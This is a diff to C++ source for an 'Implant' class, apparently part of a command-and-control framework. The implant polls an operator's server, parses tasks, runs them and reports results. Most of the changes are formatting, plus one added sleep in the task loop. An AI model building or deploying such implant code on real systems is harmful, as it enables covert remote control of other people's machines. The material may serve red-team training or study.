@@ -51,7 +51,7 @@ Implant::Implant(std::string host, std::string service,
                  boost::asio::io_context &io_context)
     : host{std::move(host)}, service{std::move(service)},
       io_context{io_context}, is_running(true), dwell_distribution_seconds{1.},
-      task_thread{std::async(std::launch::async, [this]{ service_tasks(); })} {
+      task_thread{std::async(std::launch::async, [this] { service_tasks(); })} {
 }
 
 void Implant::serve() {
@@ -61,7 +61,6 @@ void Implant::serve() {
       const auto response = send_results();
       std::cout << "Response: " << response << "\nParsing tasks.\n";
       parse_tasks(response);
-
     } catch (const std::exception &e) {
       std::cerr << e.what() << std::endl;
     }
@@ -90,11 +89,10 @@ void Implant::parse_tasks(const std::string &response) {
     {
       std::scoped_lock<std::mutex> task_lock{task_mutex};
       tasks.push_back(
-          parse_task_from(task_tree_value, [this](const auto& configuration){
+          parse_task_from(task_tree_value, [this](const auto &configuration) {
             set_mean_dwell(configuration.mean_dwell);
             set_running(configuration.is_running);
-          })
-        );
+          }));
     }
   }
 }
@@ -104,19 +102,21 @@ void Implant::set_mean_dwell(double mean_dwell) {
 }
 void Implant::set_running(bool is_running_in) { is_running = is_running_in; }
 void Implant::service_tasks() {
-  while(is_running){
+  while (is_running) {
     std::vector<Task> local_tasks;
     {
       std::scoped_lock<std::mutex> task_lock{task_mutex};
       tasks.swap(local_tasks);
     }
-    for(const auto& task : local_tasks) {
-      const auto [id, contents, success] = std::visit([](const auto &task) { return task.run(); }, task);
+    for (const auto &task : local_tasks) {
+      const auto [id, contents, success] =
+          std::visit([](const auto &task) { return task.run(); }, task);
       {
         std::scoped_lock<std::mutex> results_lock{results_mutex};
         results.add(boost::uuids::to_string(id) + ".contents", contents);
         results.add(boost::uuids::to_string(id) + ".success", success);
       }
     }
+    std::this_thread::sleep_for(std::chrono::seconds{1});
   }
 }
